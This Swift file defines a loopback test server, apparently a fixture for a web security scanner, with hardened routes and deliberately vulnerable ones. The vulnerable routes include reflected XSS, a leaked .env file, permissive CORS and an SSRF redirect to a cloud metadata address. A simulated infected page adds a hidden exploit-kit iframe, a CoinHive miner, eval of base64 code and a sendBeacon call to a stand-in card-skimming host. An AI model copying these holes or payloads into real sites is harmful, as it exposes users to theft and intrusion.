import Foundation
import Darwin

public final class LocalTestServer: @unchecked Sendable {
    public private(set) var port: Int = 0
    private var serverFD: Int32 = -1
    private var isRunning = false
    private var acceptThread: Thread?

    public init() throws {
        serverFD = socket(AF_INET, SOCK_STREAM, 0)
        guard serverFD >= 0 else {
            throw NSError(domain: "LocalTestServer", code: 1, userInfo: [NSLocalizedDescriptionKey: "Failed to create socket"])
        }

        var yes: Int32 = 1
        setsockopt(serverFD, SOL_SOCKET, SO_REUSEADDR, &yes, socklen_t(MemoryLayout<Int32>.size))

        var addr = sockaddr_in()
        addr.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = 0 // Ephemeral port
        addr.sin_addr.s_addr = inet_addr("127.0.0.1")

        let bindRes = withUnsafePointer(to: &addr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                bind(serverFD, $0, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        guard bindRes == 0 else {
            close(serverFD)
            throw NSError(domain: "LocalTestServer", code: 2, userInfo: [NSLocalizedDescriptionKey: "Failed to bind socket"])
        }

        var boundAddr = sockaddr_in()
        var len = socklen_t(MemoryLayout<sockaddr_in>.size)
        _ = withUnsafeMutablePointer(to: &boundAddr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                getsockname(serverFD, $0, &len)
            }
        }
        self.port = Int(UInt16(bigEndian: boundAddr.sin_port))

        guard listen(serverFD, 64) == 0 else {
            close(serverFD)
            throw NSError(domain: "LocalTestServer", code: 3, userInfo: [NSLocalizedDescriptionKey: "Failed to listen on socket"])
        }

        isRunning = true
        let thread = Thread { [weak self] in
            self?.acceptLoop()
        }
        thread.name = "LocalTestServer.AcceptThread"
        thread.start()
        self.acceptThread = thread
    }

    public func stop() {
        guard isRunning else { return }
        isRunning = false
        if serverFD >= 0 {
            Darwin.shutdown(serverFD, SHUT_RDWR)
            close(serverFD)
            serverFD = -1
        }
    }

    deinit {
        stop()
    }

    private func acceptLoop() {
        while isRunning && serverFD >= 0 {
            var clientAddr = sockaddr_in()
            var clientLen = socklen_t(MemoryLayout<sockaddr_in>.size)
            let clientFD = withUnsafeMutablePointer(to: &clientAddr) {
                $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                    accept(serverFD, $0, &clientLen)
                }
            }
            if clientFD < 0 {
                if !isRunning { break }
                continue
            }
            handleClient(fd: clientFD)
        }
    }

    private func handleClient(fd: Int32) {
        defer { close(fd) }

        var noSigPipe: Int32 = 1
        setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &noSigPipe, socklen_t(MemoryLayout<Int32>.size))

        var buffer = [UInt8](repeating: 0, count: 8192)
        let bytesRead = recv(fd, &buffer, buffer.count - 1, 0)
        guard bytesRead > 0 else { return }

        let rawRequest = String(decoding: buffer[0..<bytesRead], as: UTF8.self)
        let lines = rawRequest.components(separatedBy: "\r\n")
        guard let requestLine = lines.first else { return }
        let parts = requestLine.split(separator: " ")
        guard parts.count >= 2 else { return }

        let method = String(parts[0])
        let fullTarget = String(parts[1])

        var reqHeaders: [String: String] = [:]
        for line in lines.dropFirst() {
            if line.isEmpty { break }
            if let colon = line.firstIndex(of: ":") {
                let k = line[..<colon].trimmingCharacters(in: .whitespaces).lowercased()
                let v = line[line.index(after: colon)...].trimmingCharacters(in: .whitespaces)
                reqHeaders[k] = v
            }
        }

        let responseString = routeRequest(method: method, target: fullTarget, headers: reqHeaders)
        if let data = responseString.data(using: .utf8) {
            data.withUnsafeBytes { rawBuf in
                guard let base = rawBuf.baseAddress else { return }
                _ = send(fd, base, data.count, 0)
            }
        }
    }

    private func urlDecode(_ s: String) -> String {
        s.replacingOccurrences(of: "+", with: " ").removingPercentEncoding ?? s
    }

    private func htmlEscape(_ s: String) -> String {
        s.replacingOccurrences(of: "&", with: "&amp;")
         .replacingOccurrences(of: "<", with: "&lt;")
         .replacingOccurrences(of: ">", with: "&gt;")
         .replacingOccurrences(of: "\"", with: "&quot;")
         .replacingOccurrences(of: "'", with: "&#39;")
    }

    private func routeRequest(method: String, target: String, headers: [String: String]) -> String {
        let pathAndQuery = target.split(separator: "?", maxSplits: 1, omittingEmptySubsequences: false)
        let path = String(pathAndQuery[0])
        let query = pathAndQuery.count > 1 ? String(pathAndQuery[1]) : ""

        if method == "OPTIONS" && path.hasPrefix("/vuln") {
            return httpResponse(
                status: "200 OK",
                headers: [
                    "Server": "Apache/2.2.15 (CentOS)",
                    "Allow": "GET, POST, PUT, DELETE, TRACE, OPTIONS"
                ],
                body: ""
            )
        }

        // -----------------------------------------------------------------
        // DELIBERATELY VULNERABLE ROUTES (/vuln/*, /.env, /.git/HEAD)
        // -----------------------------------------------------------------
        if path == "/.env" {
            let body = "APP_ENV=staging\nDB_PASSWORD=super_secret_database_password_987\nOPENAI_API_KEY=sk-proj1234567890abcdefghij\n"
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/plain"], body: body)
        }

        if path == "/.git/HEAD" {
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/plain"], body: "ref: refs/heads/main\n")
        }

        if path == "/vuln/index.html" || path == "/vuln" {
            let body = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Vulnerable Test Portal</title>
                <script src="http://cdn.insecure-example.org/jquery-1.8.3.min.js"></script>
            </head>
            <body>
                <h1>Vulnerable Portal</h1>
                <a href="/vuln/sqli?id=1">Item Details</a>
                <a href="/vuln/xss?q=welcome">Search</a>
                <a href="/vuln/dir/">Files</a>
                <a href="/vuln/api/users">Users API</a>
                <a href="/vuln/malware.html">Malware Sample</a>
                <a href="/vuln/index.html?redirect=https://example.com">Redirect</a>

                <form method="POST" action="http://127.0.0.1:\(port)/vuln/login">
                    <input type="text" name="username" />
                    <input type="password" name="password" />
                    <input type="submit" value="Sign In" />
                </form>

                <div id="out"></div>
                <script>
                    document.getElementById('out').innerHTML = location.search;
                    //# sourceMappingURL=bundle.js.map
                </script>
            </body>
            </html>
            """
            return httpResponse(
                status: "200 OK",
                headers: [
                    "Content-Type": "text/html; charset=utf-8",
                    "Server": "Apache/2.2.15 (CentOS)",
                    "X-Powered-By": "PHP/5.4.16",
                    "Set-Cookie": "sessionid=unprotected_secret_session_value_12345; Path=/"
                ],
                body: body
            )
        }

        if path == "/vuln/sqli" {
            let decodedQuery = urlDecode(query)
            if decodedQuery.contains("'") {
                let errBody = """
                <html><body>
                Fatal error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
                </body></html>
                """
                return httpResponse(status: "500 Internal Server Error", headers: ["Content-Type": "text/html"], body: errBody)
            }
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: "<html><body>Product ID: 1</body></html>")
        }

        if path == "/vuln/xss" {
            var qVal = ""
            for pair in query.split(separator: "&") {
                let kv = pair.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
                if kv.count == 2 && kv[0] == "q" {
                    qVal = urlDecode(String(kv[1]))
                }
            }
            let body = "<html><body><h2>Search results for: \(qVal)</h2></body></html>"
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: body)
        }

        if path == "/vuln/dir/" || path == "/vuln/dir" {
            let body = """
            <html><head><title>Index of /vuln/dir/</title></head>
            <body><h1>Index of /vuln/dir/</h1><a href="../">Parent Directory</a><a href="backup.sql">backup.sql</a></body></html>
            """
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: body)
        }

        if path == "/vuln/malware.html" {
            let body = """
            <!DOCTYPE html>
            <html>
            <head><title>Infected Page Simulation</title></head>
            <body>
                <iframe width="0" height="0" src="https://malicious-tds.invalid/exploit-kit"></iframe>
                <script>
                    var miner = new CoinHive.Anonymous('site-key-simulation');
                    eval(atob("Y29uc29sZS5sb2coJ3NpbXVsYXRlZC1kcm9wcGVyJyk="));
                    var cards = document.querySelectorAll("input[name*=card_number]");
                    navigator.sendBeacon("https://magecart-collector.invalid/steal", "test");
                </script>
            </body>
            </html>
            """
            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: body)
        }

        if path == "/vuln/api/users" {
            let origin = headers["origin"] ?? "*"
            let body = """
            {"error": "Unhandled backend error on upstream 10.24.18.92", "trace": "Traceback (most recent call last):\\n  File app.py, line 42"}
            """
            return httpResponse(
                status: "200 OK",
                headers: [
                    "Content-Type": "application/json",
                    "Access-Control-Allow-Origin": origin,
                    "Access-Control-Allow-Credentials": "true"
                ],
                body: body
            )
        }

        if path == "/vuln/ssrf-redirect" {
            return httpResponse(
                status: "302 Found",
                headers: ["Location": "http://169.254.169.254/latest/meta-data/"],
                body: ""
            )
        }

        // -----------------------------------------------------------------
        // HARDENED SECURE ROUTES (/secure/*)
        // -----------------------------------------------------------------
        let secureHeaders: [String: String] = [
            "Content-Type": "text/html; charset=utf-8",
            "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
            "Cross-Origin-Resource-Policy": "same-origin",
            "Set-Cookie": "__Host-sess=hardened_token; Secure; HttpOnly; SameSite=Strict; Path=/"
        ]

        if path == "/secure/index.html" {
            let body = """
            <!DOCTYPE html>
            <html>
            <head><title>Hardened Portal</title></head>
            <body>
                <h1>Secure Portal</h1>
                <a href="/secure/sqli?id=1">Safe Item</a>
                <a href="/secure/xss?q=safe">Safe Search</a>
                <form method="POST" action="https://127.0.0.1:\(port)/secure/update">
                    <input type="hidden" name="csrf_token" value="a9b8c7d6e5f4" />
                    <input type="text" name="display_name" />
                </form>
            </body>
            </html>
            """
            return httpResponse(status: "200 OK", headers: secureHeaders, body: body)
        }

        if path == "/secure/sqli" {
            return httpResponse(status: "200 OK", headers: secureHeaders, body: "<html><body>Safe Parameterized Item</body></html>")
        }

        if path == "/secure/xss" {
            var qVal = ""
            for pair in query.split(separator: "&") {
                let kv = pair.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
                if kv.count == 2 && kv[0] == "q" {
                    qVal = htmlEscape(urlDecode(String(kv[1])))
                }
            }
            return httpResponse(status: "200 OK", headers: secureHeaders, body: "<html><body><h2>Results: \(qVal)</h2></body></html>")
        }

        return httpResponse(status: "404 Not Found", headers: ["Content-Type": "text/plain"], body: "404 Not Found")
    }

    private func httpResponse(status: String, headers: [String: String], body: String) -> String {
        let bodyBytes = body.utf8.count
        var out = "HTTP/1.1 \(status)\r\n"
        for (k, v) in headers {
            out += "\(k): \(v)\r\n"
        }
        out += "Content-Length: \(bodyBytes)\r\n"
        out += "Connection: close\r\n\r\n"
        out += body
        return out
    }
}
